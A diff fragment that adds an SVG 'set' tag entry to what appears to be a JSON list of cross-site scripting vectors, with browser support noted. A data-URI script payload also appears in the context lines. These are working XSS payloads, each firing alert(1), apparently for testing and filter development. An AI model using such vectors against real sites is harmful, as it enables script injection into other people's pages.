@@ -94,6 +94,16 @@
         ]
     },
     {
+        "description": "SVG set tag",
+        "code": "<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS<\/text><\/a>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
         "description": "Data protocol inside script src",
         "code": "<script src=\"data:text\/javascript,alert(1)\"><\/script>",
         "browsers": [
